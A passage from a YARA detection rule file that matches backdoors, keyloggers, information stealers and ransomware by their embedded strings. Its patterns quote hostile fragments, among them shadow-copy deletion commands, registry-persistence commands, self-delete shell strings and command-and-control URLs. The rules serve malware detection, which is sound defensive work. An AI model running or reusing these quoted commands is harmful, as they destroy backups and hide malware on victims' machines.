		$cmd2 = "App.Delete" ascii
		$cmd3 = "App.SetProxy" ascii
		$cmd4 = "App.SetServer" ascii
		$cmd5 = "App.SetTimeout" ascii
		$cmd6 = "IO.WriteFile" ascii
		$cmd7 = "IO.ReadFile" ascii
		$cmd8 = "OS.ShellExecute" ascii
		$cmd9 = "awk 'match($0, /(upstart|systemd|sysvinit)/){ print substr($0, RSTART, RLENGTH);exit;" ascii
		$ws1 = "/commands/@slp" wide
		$ws2 = "/commands/cmd" wide
		$ws3 = "/settings/proxy/@password" wide
		$ws4 = "/settings/servers/server[@current='true']" wide
		$ws5 = "/settings/servers/server/@current[text()='true']" wide
		$ws6 = "/settings/servers/server[text()='%s']/@current" wide
		$ws7 = "/settings/servers/server[%d]" wide
		$ws8 = "/settings/storage" wide
		$ws9 = "/settings/check" wide
		$ws10 = "/settings/interval" wide
		$ws11 = "report.txt" wide
		$ws12 = "stg%02d.cab" ascii
		$ws13 = "urlmon.dll" ascii
		$ws14 = "ReportDir" ascii

	condition:
		( uint16( 0 ) == 0x457f and ( all of ( $s* ) and 6 of ( $cmd* ) ) ) or ( uint16( 0 ) == 0x5a4d and 12 of ( $ws* ) )
}
rule DITEKSHEN_MALWARE_Linux_Hiddenwasp : FILE
{
	meta:
		description = "HiddenWasp backdoor payload"
		author = "ditekSHen"
		id = "220e5e6e-7c5c-5f70-b3eb-50d9c5ec636d"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L461-L486"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a2aad022de41ba2633fc92a7dc5a5fa2efde9da2211cfc01fb2999e33365d6c9"
		score = 75
		quality = 71
		tags = "FILE"
		clamav_sig1 = "MALWARE_Linux.Trojan.HiddenWasp-ELF"
		clamav_sig2 = "MALWARE_Linux.Trojan.HiddenWasp-Script"

	strings:
		$x1 = "I_AM_HIDDEN" fullword ascii
		$x2 = "HIDE_THIS_SHELL" fullword ascii
		$x3 = "NewUploadFile" ascii
		$x4 = "fake_processname" ascii
		$x5 = "swapPayload" ascii
		$x6 = /Trojan-(Platform|Machine|Hostname|OSersion)/ fullword ascii
		$s1 = "FileOpration::GetFileData" fullword ascii
		$s2 = "FileOpration::NewUploadFile" fullword ascii
		$s3 = "Connection::writeBlock" fullword ascii
		$s4 = /hiding_(hidefile|enable_logging|hideproc|makeroot)/ fullword ascii
		$s5 = "Reverse-Port" fullword ascii
		$s6 = "hidden_services" fullword ascii
		$s7 = "check_config" fullword ascii
		$s8 = "__data_start" fullword ascii
		$s9 = /patch_(suger_lib|ld|lib)/ fullword ascii
		$s10 = "hexdump -ve '1/1 \"%%.2X\"' %s | sed \"s/%s/%s/g\" | xxd -r -p > %s.tmp"

	condition:
		uint16( 0 ) == 0x457f and ( 4 of ( $x* ) or all of ( $s* ) or ( 3 of ( $x* ) and 5 of ( $s* ) ) )
}
rule DITEKSHEN_MALWARE_Multi_Wellmess : FILE
{
	meta:
		description = "WellMess Windows/Linux backdoor payload"
		author = "ditekSHen"
		id = "cfa0f077-9d45-5796-b888-66fb397e74f8"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L488-L510"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9cbbca609fd289d7406d9073237688d250dc68c450676b9b755509540d8f76a5"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig1 = "MALWARE_Win.Trojan.WellMess_DotNet"
		clamav_sig2 = "MALWARE_Win.Trojan.WellMess_Golang"
		clamav_sig3 = "MALWARE_Linux.Trojan.WellMess_Golang"

	strings:
		$s1 = "-----BEGIN PUBLIC KEY-----" ascii
		$s2 = "-----END PUBLIC KEY-----" ascii
		$s3 = "net/http.(*persistConn).readResponse" ascii
		$s4 = "net/http/cookiejar.(*Jar).SetCookies" ascii
		$s5 = "_/home/ubuntu/GoProject/src/bot/botlib" ascii
		$s6 = "<;head;><;title;>" ascii
		$s7 = "<;title;><;service;>" ascii
		$s8 = "http://invalidlookup" ascii
		$s9 = "<autogenerated>" ascii wide

	condition:
		( uint16( 0 ) == 0x457f or uint16( 0 ) == 0x5a4d ) and all of them
}
rule DITEKSHEN_MALWARE_Win_Konni : FILE
{
	meta:
		description = "Konni payload"
		author = "ditekSHen"
		id = "86eae9f6-60b0-5720-8528-ddbe32b6d4a6"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L512-L530"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "d57c51f7ede28b74395e5e0fbcc5fd9247b3353330f3e549d5abf99bbd7a1b93"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "uplog.tmp" fullword wide
		$s2 = "upfile.tmp" fullword wide
		$s3 = "%s-log-%s" fullword ascii wide
		$s4 = "%s-down" ascii wide
		$s5 = "%s-file-%s" fullword ascii wide
		$s6 = "\"rundll32.exe\" \"%s\" install" fullword wide
		$s7 = "subject=%s&data=" fullword ascii
		$s8 = "dll-x64.dll" fullword ascii
		$s9 = "dll-x32.dll" fullword ascii
		$pdb1 = "\\virus-dropper\\Release\\virus-dropper.pdb" ascii
		$pdb2 = "\\virus-init\\Release\\virus-init.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 7 of ( $s* ) or ( 3 of ( $s* ) and 1 of ( $pdb* ) ) )
}
rule DITEKSHEN_MALWARE_Win_Tjkeylogger : FILE
{
	meta:
		description = "TJKeylogger payload"
		author = "ditekSHen"
		id = "6aaa11b2-3734-5538-b593-f5276f3acc72"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L553-L567"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "52d98a6f5a2cfc6717b7097b4e70c1e813851222f9f06ae74be4e5703b0b0dde"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "TJKeyLogger" fullword ascii
		$s2 = "software\\microsoft\\windows\\currentversion\\run" fullword ascii
		$s3 = "\\Passwords.txt" ascii
		$s4 = "TJKeyLogItem" fullword ascii
		$s5 = "TJKeyAsyncLog" fullword ascii
		$s6 = "FM_GETDSKLST" fullword ascii
		$s7 = "KL_GETMODE" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}
rule DITEKSHEN_MALWARE_Win_W1RAT : FILE
{
	meta:
		description = "W1 RAT payload"
		author = "ditekSHen"
		id = "d5841bc0-97e7-575e-91f6-d264f507a8b5"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L569-L585"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "84b9a2e309ed9ab0fb8343d941585356d23348683073d0a37fc7194f58a43a0e"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "/c /Ox /Fa\"%s/%s.asm\" /Fo\"%s/%s.obj\" \"%s/%s.%s\"" ascii
		$s2 = "this->piProcInfo.hProcess" fullword ascii
		$s3 = "index >= 0 && index < this->reg_tab->GetLen()" fullword ascii
		$s4 = "strcpy(log_font.lfFaceName,\"%s\");" fullword ascii
		$s5 = "WorkShop -- [%s]" fullword ascii
		$s6 = "HeaderFile.cpp" fullword ascii
		$s7 = "WndLog.cpp" fullword ascii
		$s8 = "assertion fail \"%s\" at file=%s line=%d" fullword ascii
		$s9 = "Stdin   pipe   creation   failed" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d and 6 of ( $s* ) ) or ( all of them )
}
rule DITEKSHEN_MALWARE_Win_Tefosteal : FILE
{
	meta:
		description = "Tefosteal payload"
		author = "ditekSHen"
		id = "56646933-3ed3-5b77-9135-993b57603490"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L653-L674"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a350863270cbe3349f271e55d66a2ebdd6406e8d122c11071de74a774eb77ebf"
		score = 75
		quality = 71
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Trojan.Tefosteal"

	strings:
		$s1 = "netsh wlan show networks mode=bssid" nocase fullword wide
		$s2 = "LoginCredentialService.GetLoginCredentials$" ascii
		$s3 = "DefaultLoginCredentials.LoginEventUsrPw$" ascii
		$s4 = "SEC_E_NO_KERB_KEY" wide
		$s5 = "TList<System.Zip.TZipHeader>." ascii
		$s6 = "_Password.txt" fullword wide nocase
		$s7 = "_Cookies.txt" fullword wide nocase
		$f1 = "\\InfoPC\\BSSID.txt" wide
		$f2 = "\\Files\\Telegram\\" wide
		$f3 = "\\InfoPC\\Screenshot.png" wide
		$f4 = "\\InfoPC\\Systeminfo.txt" wide
		$f5 = "\\Steam\\config" wide
		$f6 = "\\delete.vbs" wide

	condition:
		uint16( 0 ) == 0x5a4d and 4 of ( $s* ) and 2 of ( $f* )
}
rule DITEKSHEN_MALWARE_Win_Cryptostealergo : FILE
{
	meta:
		description = "CryptoStealerGo payload"
		author = "ditekSHen"
		id = "83886aeb-af7e-564c-989a-fb7d955814e2"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L676-L692"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "0050be7522e7d89cb9688e63fdca11d24baa74aa858e8c19ee7b4658518536b6"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Go build ID: \"" ascii
		$s2 = "file_upload.go" ascii
		$s3 = "grequests.FileUpload" ascii
		$s4 = "runtime.newproc" ascii
		$s5 = "credit_cards" ascii
		$s6 = "zip.(*fileWriter).Write" ascii
		$s7 = "autofill_" ascii
		$s8 = "XFxVc2VyIERhdGFcXA==" ascii
		$s9 = "XFxBcHBEYXRhXFxMb2NhbFxc" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 8 of them
}
rule DITEKSHEN_MALWARE_Win_M00Nd3V : FILE
{
	meta:
		description = "M00nD3v keylogger payload"
		author = "ditekSHen"
		id = "4000f55d-e072-50b6-b6ee-72cefc0ec53f"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L694-L715"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "68a0888da3b114dc895fe18a3d03b2b88d140fbf82b888f7a031b9364d01aabf"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "M00nD3v Stub" ascii wide
		$s2 = "M00nD3v{0}{1} Logs{0}{2} \\ {3}{0}{0}{4}" fullword wide
		$s3 = "Anti-Keylogger Elite" wide
		$s4 = "/C TASKKILL /F /IM" wide
		$s5 = "echo.>{0}:Zone.Identifier" fullword wide
		$s6 = "> Nul & Del \"{0}\" & start \"\" \"{1}.exe\"" wide
		$s7 = "> Nul & start \"\" \"{1}.exe\"" wide
		$s8 = "Stealer" fullword wide
		$s9 = "{0}{0}++++++++++++{1} {2}++++++++++++{0}{0}" wide
		$s10 = "{4}Application: {3}{4}URL: {0}{4}Username: {1}{4}Password: {2}{4}" wide
		$s11 = "encrypted_key\":\"(?<Key>.+?)\"" wide
		$s12 = "Botkiller" fullword ascii
		$s13 = "AVKiller" fullword ascii
		$s14 = "get_pnlPawns" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d and 6 of them ) or ( 9 of them )
}
rule DITEKSHEN_MALWARE_Win_Vssdestroy : FILE
{
	meta:
		description = "VSSDestroy/Matrix ransomware payload"
		author = "ditekSHen"
		id = "734ece56-b993-5b44-ae15-f673fabfe8ad"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L717-L740"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "24bfd32580f784440252d629a7ab86b84a570ded34409940616be2a89bf73088"
		score = 75
		quality = 75
		tags = "FILE"
		snort_sid = "920008-920009"
		clamav_sig = "MALWARE.Win.Ransomware.VSSDestroy"

	strings:
		$o1 = "[SHARESSCAN]" wide
		$o2 = "[LDRIVESSCAN]" wide
		$o3 = "[LOGSAVED]" wide
		$o4 = "[LPROGRESS]" wide
		$o5 = "[FINISHSAVED]" wide
		$o6 = "[ALL_LOCAL_KID]" wide
		$o7 = "[DIRSCAN" wide
		$o8 = "[GENKEY]" wide
		$s1 = "\\cmd.exe" nocase wide
		$s2 = "/C powershell \"" nocase wide
		$s3 = "%COMPUTERNAME%" wide
		$s4 = "%USERNAME%" wide
		$s5 = "Error loading Socket interface (ws2_32.dll)!" wide
		$s6 = "Old file list dump found. Want to load it? (y/n):" fullword wide

	condition:
		( uint16( 0 ) == 0x5a4d and 4 of ( $o* ) and 3 of ( $s* ) ) or ( 5 of ( $o* ) and 4 of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Win_Goldenaxe : FILE
{
	meta:
		description = "GoldenAxe ransomware payload"
		author = "ditekSHen"
		id = "23874106-dbbb-5cb2-b61a-1661d8e2d868"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L742-L763"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6dfd88ce65acdfed4749e3b817b317c3c514ea42f892a7f5f95853c148507918"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Ransomware.GoldenAxe"

	strings:
		$s1 = "Go build ID: " ascii
		$s2 = "taskkill.exe" ascii
		$s3 = "cmd.exe" ascii
		$s4 = "Speak.Speak" ascii
		$s5 = "CLNTSRVRnull" ascii
		$s6 = "-----END" ascii
		$s7 = "-----BEGIN" ascii
		$s8 = ".EncryptFile" ascii
		$g1 = "GoldenAxe/Utils." ascii
		$g2 = "GoldenAxe/Cryptography." ascii
		$g3 = "GoldenAxe/Walker." ascii
		$g4 = "C:/Users/alpha/go/src/GoldenAxe/" ascii
		$g5 = "'Golden Axe ransomware'" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $s* ) or ( 1 of ( $g* ) and 1 of ( $s* ) ) )
}
rule DITEKSHEN_MALWARE_Win_Robbinhood : FILE
{
	meta:
		description = "Robbinhood ransomware payload"
		author = "ditekSHen"
		id = "a5066a22-3c87-5e9f-a94f-5a44af2f96fd"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L765-L787"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f1c4226ed5cb1583418d5ef0efc2c2b5bc3cfe7f148f359c5d432fd660331a46"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Ransomware.Robbinhood"

	strings:
		$go = "Go build ID:" ascii
		$cmd1 = "cmd.exe /c" ascii
		$cmd2 = "net use * /DELETE" nocase ascii
		$cmd3 = "sc.exe stop" ascii
		$cmd4 = "vssadmin resize shadowstorage" nocase ascii
		$s1 = /Skipping\s(file|dir)/ ascii
		$s2 = "Encrypt[ERR] GET Size:" ascii
		$s3 = ".taskkilltasklistunknown(" ascii
		$s4 = ".sysvssadmin.exewevtutil.exe MB released" ascii
		$s5 = ".sysvssadmin.exewevtutil.exewinlogin.exewinlogon.exe MB released" ascii
		$s6 = ".enc_robbinhood" ascii
		$s7 = "c:\\windows\\temp\\pub.key" nocase ascii
		$s8 = "main.CoolMaker" ascii
		$s9 = "/valery/go/src/oldboy/" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( $go and 1 of ( $cmd* ) and 3 of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Win_Getcrypt : FILE
{
	meta:
		description = "GetCrypt ransomware payload"
		author = "ditekSHen"
		id = "fb6db807-372f-59e6-96c6-54dd4ece336d"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L789-L825"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "fd7ee98757c3ac1f2b2a4dd9041c78d33273d7a7d596c3d99c6b8d79988f29f1"
		score = 75
		quality = 73
		tags = "FILE"
		clamav_sig1 = "MALWARE_Win.Ransomware.GetCrypt-1"
		clamav_sig2 = "MALWARE_Win.Ransomware.GetCrypt-2"

	strings:
		$x1 = "delete shadows /all /quiet" wide
		$x2 = "C:\\Windows\\System32\\svchost.exe" fullword wide
		$x3 = "desk.bmp" fullword wide
		$x4 = ":\\Boot" fullword wide
		$x5 = "\\encrypted_key.bin" fullword wide
		$x6 = "vssadmin.exe" fullword wide
		$x7 = ":\\Recovery" fullword wide
		$s1 = "CryptEncrypt" fullword ascii
		$s2 = "NtWow64ReadVirtualMemory64" fullword ascii
		$s3 = "MPR.dll" fullword ascii
		$s4 = "%key%" fullword ascii
		$s5 = "CryptDestroyKey" fullword ascii
		$s6 = "ntdll.dll" fullword ascii
		$s7 = "WNetCancelConnection2W" fullword ascii
		$s8 = ".%c%c%c%c" fullword wide
		$s10 = { 43 72 79 70 74 49 6d 70 6f 72 74 4b 65 79 00 00
                 cb 00 43 72 79 70 74 45 6e 63 72 79 70 74 00 00
                 c1 00 43 72 79 70 74 41 63 71 75 69 72 65 43 6f
                 6e 74 65 78 74 41 00 00 c8 00 43 72 79 70 74 44
                 65 73 74 72 6f 79 4b 65 79 00 d2 00 43 72 79 70
                 74 47 65 6e 52 61 6e 64 6f 6d 00 00 c2 00 43 72
                 79 70 74 41 63 71 75 69 72 65 43 6f 6e 74 65 78
                 74 57 00 00 41 44 56 41 50 49 33 32 2e 64 6c 6c
                 00 00 b5 01 53 68 65 6c 6c 45 78 65 63 75 74 65
                 45 78 57 00 53 48 45 4c 4c 33 32 2e 64 6c 6c 00 }

	condition:
		uint16( 0 ) == 0x5a4d and ( 3 of ( $x* ) or 8 of ( $s* ) )
}
rule DITEKSHEN_MALWARE_Joego : FILE
{
	meta:
		description = "JoeGo ransomware payload"
		author = "ditekSHen"
		id = "23d38bcd-e66d-5ff1-ad6a-3e6432d83562"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L827-L847"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "3ddf3506aefb3cd1845f9daa689848a02a2422ca98c5c984bc918cc7ea2b2677"
		score = 75
		quality = 75
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Ransomware.JoeGo"

	strings:
		$go = "Go build ID:" ascii
		$s1 = "%SystemRoot%\\system32\\%v." ascii
		$s2 = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V" ascii
		$s3 = "/t REG_SZ /F /D %userprofile%\\" ascii
		$s4 = "(sensitive) [recovered]" ascii
		$s5 = "/dev/stderr/dev/stdout/index.html" ascii
		$s6 = "%userprofile%\\SystemApps" ascii
		$s7 = "p=<br>ACDTACSTAEDTAESTAKDTAKSTAWSTA" ascii
		$cnc1 = "/detail.php" ascii
		$cnc2 = "/checkin.php" ascii
		$cnc3 = "/platebni_brana.php" ascii
		$cnc4 = "://nebezpecnyweb.eu/" ascii

	condition:
		uint16( 0 ) == 0x5a4d and $go and ( all of ( $s* ) or ( 3 of ( $s* ) and 1 of ( $cnc* ) ) )
}
rule DITEKSHEN_MALWARE_Win_Aurora : FILE
{
	meta:
		description = "Aurora ransomware payload"
		author = "ditekSHen"
		id = "d3eafe9c-c8d9-5744-ba5d-4eb0249cceea"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L849-L869"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "056bb11e8b947ef90462503db82b2001e4a5d4847fad9c0d5d771384a80d779a"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" fullword ascii wide
		$s2 = "#DECRYPT_MY_FILES#.txt" fullword ascii
		$s3 = "/gen.php?generate=" fullword ascii
		$s4 = "geoplugin.net/php.gp" ascii
		$s5 = "/end.php?id=" fullword ascii
		$s6 = "wotreplay" fullword ascii
		$s7 = "moneywell" fullword ascii
		$s8 = "{btc}" fullword ascii
		$s9 = ".?AV_Locimp@locale@std@@" ascii
		$s10 = ".?AV?$codecvt@DDU_Mbstatet@@@std@@" ascii
		$s11 = ".?AU_Crt_new_delete@std@@" ascii
		$pdb1 = "\\z0ddak\\Desktop\\source\\Release\\Ransom.pdb" ascii
		$pdb2 = "\\Desktop\\source\\Release\\Ransom.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( ( 1 of ( $pdb* ) and 5 of ( $s* ) ) or ( 8 of them ) )
}
rule DITEKSHEN_MALWARE_Win_Buran : FILE
{
	meta:
		description = "Buran ransomware payload"
		author = "ditekSHen"
		id = "1433bac5-2ece-54bb-8e57-b5834fffc719"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L871-L903"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "eaf50d824dbade0ca63fafc5b4a376553039de9b51a0f6387cb28c8f91a7e0b9"
		score = 75
		quality = 73
		tags = "FILE"
		clamav_sig = "MALWARE.Win.Ransomware.Buran"

	strings:
		$v1_1 = "U?$error_info_injector@V" ascii
		$v1_2 = "Browse for Folder (FTP)" fullword ascii
		$v1_3 = "Find/Replace in Files" fullword ascii
		$v1_4 = "PAHKLM" fullword ascii
		$v1_5 = "PAHKCR" fullword ascii
		$v1_6 = "chkOpt_" ascii
		$h1 = "Search <a href=\"location\" class=\"menu\">in this folder</a>" ascii
		$h2 = "<br>to find where the text below" ascii
		$h3 = "</a> files with these extensions (separate with semi-colons)" ascii
		$h4 = "Need help with <a href=\"" ascii
		$path = "\\work\\cr\\nata\\libs\\boost_" wide
		$v2_1 = "(ShlObj" fullword ascii
		$v2_2 = "\\StreamUnit" fullword ascii
		$v2_3 = "TReadme" fullword ascii
		$v2_4 = "TDrivesAndShares" fullword ascii
		$v2_5 = "TCustomMemoryStreamD" fullword ascii
		$v2_6 = "OpenProcessToken" fullword ascii
		$v2_7 = "UrlMon" fullword ascii
		$v2_8 = "HttpSendRequestA" fullword ascii
		$v2_9 = "InternetConnectA" fullword ascii
		$v2_10 = "FindFiles" fullword ascii
		$v2_12 = "$*@@@*$@@@$" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( ( ( all of ( $v1* ) and 1 of ( $h* ) ) or ( $path and 2 of ( $v1* ) and 1 of ( $h* ) ) or 10 of them ) or all of ( $v2* ) )
}
rule DITEKSHEN_MALWARE_Win_Masslogger : FILE
{
	meta:
		description = "MassLogger keylogger payload"
		author = "ditekSHen"
		id = "9181b89a-2ce8-59b6-9703-c01a8471b8d6"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L905-L934"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7d8bbefa71a1eb20cd9d029bd516d6c37e39cfa053ed0617eace200d210d9b58"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$s1 = "MassLogger v" ascii wide
		$s2 = "MassLogger Started:" ascii wide
		$s3 = "MassLogger Process:" ascii wide
		$s4 = "/panel/upload.php" wide
		$s5 = "ftp://" wide
		$s6 = "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}" fullword wide
		$s7 = "^(.*/)?([^/\\\\.]+/\\\\.\\\\./)(.+)$" fullword wide
		$s8 = "Bot Killer" ascii
		$s9 = "Keylogger And Clipboard" ascii
		$c1 = "costura.ionic.zip.reduced.dll.compressed" fullword ascii
		$c2 = "CHECKvUNIQUEq" fullword ascii
		$c3 = "HOOK/MEMORY6" fullword ascii
		$c4 = "Massfile" ascii wide
		$c5 = "Fz=[0-9]*'skips*" fullword ascii
		$c6 = ":=65535zO" fullword ascii
		$c7 = "!$!%!&!'!(!)!*!.!/!0!4!" fullword ascii
		$c8 = "5!9!:!<!>!@!E!G!J!K!L!N!O!P!`!" fullword ascii
		$c9 = "dllToLoad" fullword ascii
		$c10 = "set_CreateNoWindow" fullword ascii
		$c11 = "FtpWebRequest" fullword ascii
		$c12 = "encryptedUsername" fullword ascii
		$c13 = "encryptedPassword" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d and 9 of ( $c* ) ) or ( 5 of ( $s* ) or 9 of ( $c* ) )
}
rule DITEKSHEN_MALWARE_Win_Echelon : FILE
{
	meta:
		description = "Echelon information stealer payload"
		author = "ditekSHen"
		id = "e13d2003-c755-5dd3-bb16-8e41dd19a151"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L936-L957"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c070bf52cc51dd334ea24614e33eaa2b7b1a17e7790e586cbbb8c7e33ba1bd76"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "<GetStealer>b__" ascii
		$s2 = "clearMac" fullword ascii
		$s3 = "path2save" fullword ascii
		$s4 = "Echelon_Size" fullword ascii
		$s5 = "Echelon Stealer by" wide
		$s6 = "get__masterPassword" fullword ascii
		$s7 = "DomainDetect" fullword ascii
		$s8 = "[^\\u0020-\\u007F]" fullword wide
		$s9 = "/sendDocument?chat_id=" wide
		$s10 = "//setting[@name='Password']/value" wide
		$s11 = "Passwords_Mozilla.txt" fullword wide
		$s12 = "Passwords_Edge.txt" fullword wide
		$s13 = "@madcod" ascii wide
		$pdb = "\\Echelon-Stealer-master\\obj\\Release\\Echelon.pdb" ascii

	condition:
		( uint16( 0 ) == 0x5a4d and ( 8 of ( $s* ) or $pdb ) ) or ( 8 of ( $s* ) or $pdb )
}
rule DITEKSHEN_MALWARE_Win_Qulab
{
	meta:
		description = "Qulab information stealer payload or artifacts"
		author = "ditekSHen"
		id = "6ae24c67-5700-5330-a3bd-d542162faebb"
		date = "2020-11-06"
		modified = "2024-11-01"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/malware.yar#L959-L983"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "659d828cbef38c6362b612be9bdc05ae820f49c23684e77af6462ea677133284"
		score = 75
		quality = 75
		tags = ""
		clamav_sig = "MALWARE.Win.Trojan.QulabZ-Stealer"

	strings:
		$x1 = "QULAB CLIPPER + STEALER" ascii wide
		$x2 = "MASAD CLIPPER + STEALER" ascii wide
		$x3 = "http://teleg.run/Qulab" ascii wide
		$x4 = "http://teleg.run/jew_seller" ascii wide
		$x5 = "BUY CLIPPER + STEALER" ascii wide
		$s1 = "\\Screen.jpg" ascii wide
		$s2 = "attrib +s +h \"" ascii wide
		$s3 = "\\x86_microsoft-windows-" ascii wide
		$s4 = "\\amd64_microsoft-windows-" ascii wide
		$s5 = "Desktop TXT File" ascii wide
